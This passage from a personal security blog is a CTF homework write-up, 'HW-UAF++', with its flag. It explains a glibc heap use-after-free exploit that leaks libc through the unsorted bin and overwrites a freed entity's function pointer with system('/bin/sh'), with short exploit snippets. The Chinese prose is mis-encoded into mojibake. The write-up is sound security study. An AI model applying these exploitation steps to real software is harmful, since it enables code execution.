å¾ä¸Šåœ–å¾—çŸ¥ï¼Œnote #4çš„addresså·²ç¶“è¢«æˆ‘å€‘æ›æˆ<code>__free_hook</code> addressï¼Œä¸¦ä¸”å¯¦éš›è·Ÿé€²å»å°±æ˜¯system addressï¼Œæœ€å¾Œåªè¦freeæ‰note #2å°±å¯ä»¥é–‹shelläº†</p><h2 id=hw-uaf>HW-UAF++</h2><p>Flag: <code>flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-14>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>:::info</p><ul><li>é€™ä¸€é¡Œæ˜¯runåœ¨==20.04==çš„ç’°å¢ƒï¼Œåœ¨åšé¡Œç›®ä¹‹å‰è¦å…ˆçœ‹ä¸€ä¸‹docker file</li><li>å¦å¤–ä¸€å€‹å¾ˆé‡è¦çš„ä¸€é»æ˜¯é¡Œç›®æ˜¯ç”¨==read==è®€å–è¼¸å…¥ï¼Œæ‰€ä»¥æˆ‘å€‘ä¸éœ€è¦è¼¸å…¥null byteçµå°¾
:::</li></ul><p>é€™ä¸€é¡Œå’Œlabæœ‰å¹¾å€‹é—œéµçš„åœ°æ–¹ä¸å¤ªä¸€æ¨£ï¼Œé¦–å…ˆä»–æŠŠset_nameçš„æ“ä½œä½µåˆ°registerçš„åœ°æ–¹ï¼Œå¦å¤–ä»–é™åˆ¶è¨»å†Šçš„entityåªèƒ½æœ‰==2å€‹==ï¼Œæœ€é‡è¦çš„ä¸€é»æ˜¯ä»–æ²’æœ‰çµ¦æˆ‘å€‘heap addressæˆ–system addressçš„å¤©å¤§å¥½ç¦®ï¼Œæ‰€ä»¥æˆ‘å€‘é‚„è¦æƒ³ä¸€ä¸‹å…¶ä»–çš„æ–¹æ³•</p><ol><li><p>é¦–å…ˆï¼Œæ€è·¯æœƒæ˜¯å…ˆæƒ³è¾¦æ³•leak libc addressï¼Œä¸¦ä¸”åˆ©ç”¨åƒlabçš„æ–¹å¼æŠŠsystem function triggerèµ·ä¾†é–‹ä¸€å€‹shellçµ¦æˆ‘å€‘</p><p>leak libcçš„ç­–ç•¥å¦‚ä¸‹ï¼Œå°±åƒbackgroundæåˆ°çš„ï¼Œè¦leak libcå°±è¦å…ˆæƒ³è¾¦æ³•æŠŠchunkä¸Ÿåˆ°unsorted binä¸­ï¼Œæ‰€ä»¥å¤§å°ä¸èƒ½å¤ªå°ï¼Œlabçš„ä½œæ³•æ˜¯å…ˆæŠŠtcacheå¡«æ»¿å†freeä¸€å€‹0x88(å°±æ˜¯ä¸æœƒè¢«ä¸Ÿåˆ°fastbinçš„å¤§å°)ï¼Œä¸éå› ç‚ºé€™ä¸€é¡Œåªèƒ½è®“æˆ‘å€‘è¨»å†Šå…©å€‹entityï¼Œæ‰€ä»¥æœ‰æ²’æœ‰ç”šéº¼æ–¹å¼æ˜¯å¯ä»¥ç›´æ¥ä¸Ÿåˆ°unsorted bin?é‚£å°±æ˜¯ç›´æ¥è¨»å†Šè¶…é0x410çš„å¤§å°ï¼Œé€™æ¨£freeçš„æ™‚å€™å°±æœƒè¢«ä¸Ÿåˆ°unsorted bin</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>register(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x420</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>register(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x420</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>register(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x420</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>trigger_event(<span style=color:#ae81ff>0</span>)</span></span></code></pre></div><p>ä¸‹åœ–ç‚ºåœåœ¨deleteå®Œå¾Œçš„çµæœï¼Œå› ç‚ºentity 1çš„0x420è¢«consolidateæ‰€ä»¥æ²’æœ‰è¢«é¡¯ç¤ºå‡ºä¾†
<a href=#R-image-9c8584e6705e4982123e8598acc304bd class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/B1TitfiBT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-9c8584e6705e4982123e8598acc304bd><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/B1TitfiBT.png></a>
è€Œå†è¨»å†Šä¸€æ¬¡çš„æ„æ€æ˜¯è¦æŠŠunsorted binçš„ç©ºé–“æ‹¿å›ä¾†ï¼Œåˆå› ç‚ºä»–æ²’æœ‰æŠŠç©ºé–“æ´—æ‰ï¼Œæ‰€ä»¥æˆ‘å€‘å¾Œé¢å†triggerçš„æ™‚å€™ä»–æœƒæŠŠæ±è¥¿å°å‡ºä¾†çµ¦æˆ‘å€‘ï¼Œå¾ä¸‹åœ–å¯ä»¥çŸ¥é“entity 0çš„nameæŒ‡å‘==0x00005575416a52c0==ï¼Œä¹Ÿå°±æ˜¯ä¸€é–‹å§‹å¾unsorted binæ‹¿åˆ°çš„chunk addressï¼Œè€Œè£¡é¢çš„æ•¸å€¼ä¹Ÿçš„ç¢ºé‚„æ®˜ç•™
<a href=#R-image-52acd80ab0baebd5af7f912772017c8e class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BkbTszjBp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-52acd80ab0baebd5af7f912772017c8e><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BkbTszjBp.png></a>
å¦‚æœå¯¦éš›trigger entity 0æœƒå¦‚ä¸‹åœ–ä¸€æ¨£ï¼Œprintå‡ºnameæŒ‡å‘çš„æ±è¥¿
<a href=#R-image-ed639667a1b222d63ef50c81f2468fd2 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/r1gS2MjS6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ed639667a1b222d63ef50c81f2468fd2><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/r1gS2MjS6.png></a></p></li><li><p>æ—¢ç„¶å¯ä»¥leakå‡ºlibcçš„åœ°å€ï¼Œç•¶ç„¶æˆ‘å€‘ä¹Ÿå¯ä»¥å¯«å€¼é€²å»ï¼Œæˆ‘å€‘çš„ç›®æ¨™æ˜¯é–‹ä¸€å€‹shellï¼Œè€Œå”¯ä¸€å¯ä»¥åŸ·è¡Œfunctionçš„å°±æ˜¯åœ¨trigger eventçš„åœ°æ–¹ï¼Œå‡è¨­æˆ‘å€‘å¯ä»¥å¯«æˆå¦‚ä¸‹åœ–ä¸€æ¨£ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥è§¸ç™¼shelläº†
<a href=#R-image-4b83e706fa82ac3e448b2bc53d3efba6 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BkDyeXoST.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-4b83e706fa82ac3e448b2bc53d3efba6><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BkDyeXoST.png></a>
<a href=#R-image-202b063531103920a9189014260f7c02 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/ryBggQiB6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-202b063531103920a9189014260f7c02><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/ryBggQiB6.png></a></p></li><li><p>è¦é”æˆå¦‚ä¸Šçš„æ•ˆæœï¼Œæˆ‘æœƒå…ˆresetå„å€‹entityï¼Œç‚ºç”šéº¼è¦è¨­å®š0x20ä¹‹å¾Œæœƒç”¨åˆ°</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>register(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>register(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>register(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)</span></span></code></pre></div></li><li><p>ä»”ç´°çœ‹source codeä¸­è¨»å†Šçš„éƒ¨åˆ†ï¼Œä»–ä¸€å…±æœƒmallocå…©å€‹ç©ºé–“ï¼Œä¸€å€‹æ˜¯å›ºå®š0x20çš„entityï¼Œå¦å¤–ä¸€å€‹å°±æ˜¯æˆ‘å€‘è‡ªå·±è¨­å®šçš„nameç©ºé–“ï¼Œé€™å€‹ç©ºé–“å¯ä»¥å¯«å€¼ï¼›å¦å¤–call function pointerçš„æ™‚å€™ï¼Œä¹Ÿå°±æ˜¯åœ¨trigger eventçš„åœ°æ–¹ï¼Œä»–åªæœƒé‡å°å‰›å‰›æåˆ°çš„0x20 entity spaceå»call functionï¼Œæ‰€ä»¥æˆ‘å€‘è¦æƒ³è¾¦æ³•æŠŠæˆ‘å€‘å¯«é€²å»çš„å€¼==è¢«ç•¶æˆ0x20çš„entity==ï¼Œé€™æ¨£çš„è©±å°±å¯ä»¥ç›´æ¥call systemäº†ï¼Œé€™æœ€å¾Œä¸€æ­¥æƒ³äº†è¶…ç´šä¹…ï¼ŒåŸæœ¬æ˜¯æƒ³éš”å¤©åœ¨æˆ°ï¼Œçµæœèººåœ¨åºŠä¸Šäº”åˆ†é˜å°±ä¾†éˆæ„Ÿäº†ï¼Œå†èŠ±äº”åˆ†é˜å°±æŠŠå•é¡Œè§£æ‰äº†ğŸ˜‘</p><p>å…·é«”æµç¨‹å¦‚ä¸‹</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>delete(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>register(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x18</span>, p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p64(bin_sh_addr) <span style=color:#f92672>+</span> p64(system_addr))
</span></span><span style=display:flex><span>trigger_event(<span style=color:#ae81ff>1</span>)</span></span></code></pre></div><p>é¦–å…ˆæŠŠé€™å…©å€‹entityéƒ½freeæ‰ï¼Œé€™æ¨£å›æ”¶å€å°±æœƒå¦‚ä¸‹åœ–ä¸€æ¨£
<a href=#R-image-8a2240db30285b47203bd23d4fa8e2c3 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/B1fdM7iHT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-8a2240db30285b47203bd23d4fa8e2c3><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/B1fdM7iHT.png></a>
æ¥è‘—æˆ‘å€‘è¨»å†Šentity 0ï¼Œåˆå› ç‚ºé€™ä¸€æ¬¡è¦çš„ç©ºé–“æ˜¯0x18ï¼Œæ‰€ä»¥ä»–æœƒæŠŠå‰é¢entity 1çš„ç©ºé–“éƒ½æ‹¿å›ä¾†ä½¿ç”¨ï¼Œå¦‚æœæˆ‘å€‘åˆæŠŠé–‹shellçš„è³‡è¨Šå¯«é€²å»ï¼Œå°±æœƒå¦‚ä¸‹åœ–
<a href=#R-image-361de3dda357c075bcf0a2ef6bd9d8fa class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/Sk6GXXoS6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-361de3dda357c075bcf0a2ef6bd9d8fa><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/Sk6GXXoS6.png></a>
æ­¤æ™‚åŸæœ¬è¢«freeæ‰çš„entity 1çš„ç©ºé–“å°±æœƒè®Šæˆentity 0çš„name spaceï¼Œæ­¤æ™‚æˆ‘å€‘åªè¦trigger entity 1å°±æœƒé–‹shelläº†ï¼Œå¦‚ä¸‹åœ–
<a href=#R-image-7e22301f669088808292e9ccc9b0d135 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/ByhCXQjrT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-7e22301f669088808292e9ccc9b0d135><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/ByhCXQjrT.png></a></p></li></ol><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=/index.html><div class=logo-title>SBK Hugo Site</div></a></div><search><form action=/search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-id=/index.html><a class=padding href=/index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li data-nav-id=/books-notes/index.html><a class=padding href=/books-notes/index.html>Books Notes</a><ul id=R-subsections-0771445a148f63eb6cc1a9b7ad45a36a class=collapsible-menu></ul></li><li data-nav-id=/data-structure/index.html><a class=padding href=/data-structure/index.html>Data Structures</a><ul id=R-subsections-58892abc7cea06bf1839098c82b3eb4d class=collapsible-menu></ul></li><li data-nav-id=/job/index.html><a class=padding href=/job/index.html>Jobs</a><ul id=R-subsections-0fce2c1f4d6d23f49b605855a82f55aa class=collapsible-menu></ul></li><li data-nav-id=/knowledge/index.html><a class=padding href=/knowledge/index.html>Knowledges</a><ul id=R-subsections-0bdb754d722e03f187f2117c1ef8015d class=collapsible-menu></ul></li><li data-nav-id=/leetcode/index.html><a class=padding href=/leetcode/index.html>LeetCodes</a><ul id=R-subsections-76e85062179d09303530c47eb73fc667 class=collapsible-menu></ul></li><li data-nav-id=/problem-solutions/index.html><a class=padding href=/problem-solutions/index.html>Problem Solutions</a><ul id=R-subsections-4f9e0f3095337026c1723515d5409f89 class=collapsible-menu></ul></li><li class=parent data-nav-id=/security/index.html><a class=padding href=/security/index.html>Securities</a><ul id=R-subsections-66815ecaaecfc1c209e5637d03b258b2 class=collapsible-menu><li data-nav-id=/security/course/ntu-padns/ad-of-network-security---lab-12/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security---lab-12/index.html>A&amp;D of Network Security - Lab 12</a></li><li data-nav-id=/security/course/ntu-padns/ad-of-network-security---lab-13/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security---lab-13/index.html>A&amp;D of Network Security - Lab 13</a></li><li data-nav-id=/security/course/ntu-padns/ad-of-network-security---lab-14/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security---lab-14/index.html>A&amp;D of Network Security - Lab 14</a></li><li data-nav-id=/security/course/ntu-padns/ad-of-network-security---lab-2/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security---lab-2/index.html>A&amp;D of Network Security - Lab 2</a></li><li data-nav-id=/security/course/ntu-padns/ad-of-network-security---lab-3/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security---lab-3/index.html>A&amp;D of Network Security - Lab 3</a></li><li data-nav-id=/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/index.html>A&amp;D of Network Security - Lab 4(ARP & DNS SPOOFING)</a></li><li data-nav-id=/security/course/ntu-padns/ad-of-network-security---lab-7/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security---lab-7/index.html>A&amp;D of Network Security - Lab 7</a></li><li data-nav-id=/security/course/ntu-padns/ad-of-network-security-note/index.html><a class=padding href=/security/course/ntu-padns/ad-of-network-security-note/index.html>A&amp;D of Network Security Note</a></li><li data-nav-id=/security/practice/adworld/misc/adworld---3-1/index.html><a class=padding href=/security/practice/adworld/misc/adworld---3-1/index.html>Adworld - 3-1</a></li><li data-nav-id=/security/practice/adworld/misc/adworld---miao~/index.html><a class=padding href=/security/practice/adworld/misc/adworld---miao~/index.html>Adworld - miao~</a></li><li data-nav-id=/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/index.html><a class=padding href=/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/index.html>Adworld - Miscæ–‡ä»¶é¡å‹</a></li><li data-nav-id=/security/practice/adworld/misc/adworld---pure_color/index.html><a class=padding href=/security/practice/adworld/misc/adworld---pure_color/index.html>Adworld - pure_color</a></li><li data-nav-id=/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/index.html><a class=padding href=/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/index.html>Adworld - å¿ƒå„€çš„å…¬å¸</a></li><li data-nav-id=/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/index.html><a class=padding href=/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/index.html>Adworld - é©åˆä½œç‚ºæ¡Œé¢</a></li><li data-nav-id=/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/index.html><a class=padding href=/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/index.html>AIS3 EOF 2023 åˆè³½</a></li><li data-nav-id=/security/competition/ais3-eof-2024/index.html><a class=padding href=/security/competition/ais3-eof-2024/index.html>AIS3 EOF 2024</a></li><li data-nav-id=/security/competition/ais3-pre-exam-2023/index.html><a class=padding href=/security/competition/ais3-pre-exam-2023/index.html>AIS3 Pre-Exam 2023</a></li><li data-nav-id=/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/index.html><a class=padding href=/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/index.html>Background</a></li><li data-nav-id=/security/competition/balsnctf-2023/index.html><a class=padding href=/security/competition/balsnctf-2023/index.html>BalsnCTF 2023</a></li><li data-nav-id=/security/practice/btlo/incident-response/btlo---bruteforce/index.html><a class=padding href=/security/practice/btlo/incident-response/btlo---bruteforce/index.html>BTLO - Bruteforce</a></li><li data-nav-id=/security/practice/btlo/incident-response/btlo---follina/index.html><a class=padding href=/security/practice/btlo/incident-response/btlo---follina/index.html>BTLO - Follina</a></li><li data-nav-id=/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/index.html><a class=padding href=/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/index.html>BTLO - Log Analysis -Compromised WordPress</a></li><li data-nav-id=/security/practice/btlo/digital-forensic/btlo---meta/index.html><a class=padding href=/security/practice/btlo/digital-forensic/btlo---meta/index.html>BTLO - Meta</a></li><li data-nav-id=/security/practice/btlo/incident-response/btlo---paranoid/index.html><a class=padding href=/security/practice/btlo/incident-response/btlo---paranoid/index.html>BTLO - Paranoid</a></li><li data-nav-id=/security/practice/btlo/security-operation/btlo---phishing-analysis/index.html><a class=padding href=/security/practice/btlo/security-operation/btlo---phishing-analysis/index.html>BTLO - Phishing Analysis</a></li><li data-nav-id=/security/practice/btlo/incident-response/btlo---secrets/index.html><a class=padding href=/security/practice/btlo/incident-response/btlo---secrets/index.html>BTLO - Secrets</a></li><li data-nav-id=/security/practice/btlo/digital-forensic/btlo---shiba-insider/index.html><a class=padding href=/security/practice/btlo/digital-forensic/btlo---shiba-insider/index.html>BTLO - Shiba Insider</a></li><li data-nav-id=/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/index.html><a class=padding href=/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/index.html>CGGC 2023 åˆè³½</a></li><li data-nav-id=/security/practice/crewctf/bad/crewctf---_-1_-questions/index.html><a class=padding href=/security/practice/crewctf/bad/crewctf---_-1_-questions/index.html>CrewCTF - :-1: Questions</a></li><li data-nav-id=/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/index.html><a class=padding href=/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/index.html>CrewCTF - Attaaaaack 1-13</a></li><li data-nav-id=/security/practice/crewctf/misc/crewctf---encrypt10npart-1/index.html><a class=padding href=/security/practice/crewctf/misc/crewctf---encrypt10npart-1/index.html>CrewCTF - Encrypt10n(Part 1)</a></li><li data-nav-id=/security/practice/crewctf/misc/crewctf---encrypt10npart-2/index.html><a class=padding href=/security/practice/crewctf/misc/crewctf---encrypt10npart-2/index.html>CrewCTF - Encrypt10n(Part 2)</a></li><li data-nav-id=/security/practice/crewctf/reverse/crewctf---ez-rev/index.html><a class=padding href=/security/practice/crewctf/reverse/crewctf---ez-rev/index.html>CrewCTF - ez rev</a></li><li data-nav-id=/security/practice/crewctf/web/crewctf---sequence_gallery/index.html><a class=padding href=/security/practice/crewctf/web/crewctf---sequence_gallery/index.html>CrewCTF - sequence_gallery</a></li><li data-nav-id=/security/course/ntu-cns/cryptography-and-network-security---final-project/index.html><a class=padding href=/security/course/ntu-cns/cryptography-and-network-security---final-project/index.html>Cryptography and Network Security - Final Project</a></li><li data-nav-id=/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/index.html><a class=padding href=/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/index.html>Cryptography and Network Security - Regular Critique 2</a></li><li data-nav-id=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/index.html><a class=padding href=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/index.html>Cryptography and Network Security â€“ Comparative Critique 1</a></li><li data-nav-id=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/index.html><a class=padding href=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/index.html>Cryptography and Network Security â€“ Comparative Critique 2</a></li><li data-nav-id=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/index.html><a class=padding href=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/index.html>Cryptography and Network Security â€“ Comparative Critique 3</a></li><li data-nav-id=/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/index.html><a class=padding href=/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/index.html>Cryptography and Network Security â€“ Homework 1</a></li><li data-nav-id=/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/index.html><a class=padding href=/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/index.html>Cryptography and Network Security â€“ Homework 2</a></li><li data-nav-id=/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/index.html><a class=padding href=/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/index.html>Cryptography and Network Security â€“ Homework 3</a></li><li data-nav-id=/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/index.html><a class=padding href=/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/index.html>Cryptography and Network Security â€“ HW0</a></li><li data-nav-id=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/index.html><a class=padding href=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/index.html>Cryptography and Network Security â€“ Regular Critique 3</a></li><li data-nav-id=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/index.html><a class=padding href=/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/index.html>Cryptography and Network Security â€“ Regular Critique 4</a></li><li data-nav-id=/security/course/ntu-crypto/cryptography-lec-1overview---notes/index.html><a class=padding href=/security/course/ntu-crypto/cryptography-lec-1overview---notes/index.html>Cryptography Lec 1(Overview) - Notes</a></li><li data-nav-id=/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/index.html><a class=padding href=/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/index.html>Cryptography Lec 2(Historical Ciphers) - Notes</a></li><li data-nav-id=/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/index.html><a class=padding href=/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/index.html>Cryptography Lec 3(Mathematical Background) - Notes</a></li><li data-nav-id=/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/index.html><a class=padding href=/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/index.html>Cryptography Lec 4(Information Theory) - Notes</a></li><li data-nav-id=/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/index.html><a class=padding href=/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/index.html>Cryptography Lec 5(Symmetric Key Cryptography) - Notes</a></li><li data-nav-id=/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/index.html><a class=padding href=/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/index.html>Cryptography Lec 6(Key Agreement Protocol) - Notes</a></li><li data-nav-id=/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/index.html><a class=padding href=/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/index.html>CSC 2023 æ±ºè³½</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html>CSRF - APPRENTICE</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/index.html>CyberDefender - BlackEnergy</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/index.html>CyberDefender - CorporateSecrets (Part 1)</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/index.html>CyberDefender - CorporateSecrets (Part 2)</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/index.html>CyberDefender - CorporateSecrets (Part 3)</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/index.html>CyberDefender - CorporateSecrets (Part 4)</a></li><li data-nav-id=/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/index.html><a class=padding href=/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/index.html>CyberDefender - GrabThePhisher</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/index.html>CyberDefender - Hunter (Part 1)</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/index.html>CyberDefender - Hunter (Part 2)</a></li><li 